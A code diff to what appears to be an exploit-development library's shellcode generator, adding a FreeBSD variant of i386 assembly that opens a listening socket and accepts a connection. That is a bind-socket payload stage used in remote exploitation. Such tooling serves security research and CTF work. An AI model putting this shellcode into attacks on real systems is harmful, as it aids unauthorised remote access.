@@ -1,12 +1,58 @@
 from pwn.internal.shellcode_helper import *
 
-@shellcode_reqs(arch='i386', os='linux', network='ipv4')
-def listen(port):
+@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
+def listen(port, os = None):
     """Args: port
     Waits for a connection.  Leaves socket in EBP."""
-    return """
+
+    if os == 'freebsd':
+        return """
         ;; Listens for and accepts a connection on %(portnum)d
-        ;; Socket file descriptor is placed in EAX
+        ;; Socket file descriptor is placed in EBP
+
+        ;; sock = socket(AF_INET, SOCK_STREAM, 0)
+        push SYS_socket
+        pop eax
+        cdq
+        push edx
+        push SOCK_STREAM
+        push AF_INET
+        push edx
+        int 0x80
+
+        ;; bind(sock, &addr, sizeof addr); // sizeof addr == 0x10
+        push 0x10 | (AF_INET << 8) | (%(port)d << 16) ;; sa_len and sa_family does't really matter, but why not set them right?
+        mov ebx, esp
+        push 0x10
+        push ebx
+        push eax
+        push eax
+        mov al, SYS_bind
+        int 0x80
+    
+        ;; listen(sock, whatever)
+        mov al, SYS_listen
+        int 0x80
+
+        ;; accept(sock, NULL, whatever)
+        pop ebx
+        push edx
+        push ebx 
+        push ebx
+        mov al, SYS_accept
+        int 0x80
+
+        push ebx
+        push eax
+        mov al, SYS_close
+        int 0x80
+        pop ebp
+""" % {'port'    : htons(int(port)),
+       'portnum' : int(port)}
+    elif os == 'linux':
+        return """
+        ;; Listens for and accepts a connection on %(portnum)d
+        ;; Socket file descriptor is placed in EBP
 
         ;; sock = socket(AF_INET, SOCK_STREAM, 0)
         push SYS_socketcall
@@ -56,3 +102,5 @@ def listen(port):
         int 0x80
 """ % {'port'    : htons(int(port)),
        'portnum' : int(port)}
+    else:
+        bug('OS was neither linux nor freebsd')
